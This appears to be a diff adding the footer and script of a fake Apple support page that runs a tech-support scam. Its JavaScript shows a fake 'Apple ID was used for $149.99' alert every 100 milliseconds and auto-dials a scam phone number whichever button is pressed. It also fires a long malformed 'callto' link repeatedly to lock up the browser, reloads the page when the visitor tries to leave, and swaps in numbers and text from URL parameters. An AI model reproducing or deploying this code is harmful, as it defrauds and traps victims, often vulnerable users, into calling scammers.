+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-866-381-6140
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-866-381-6140');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-381-6140"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-866-381-6140 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
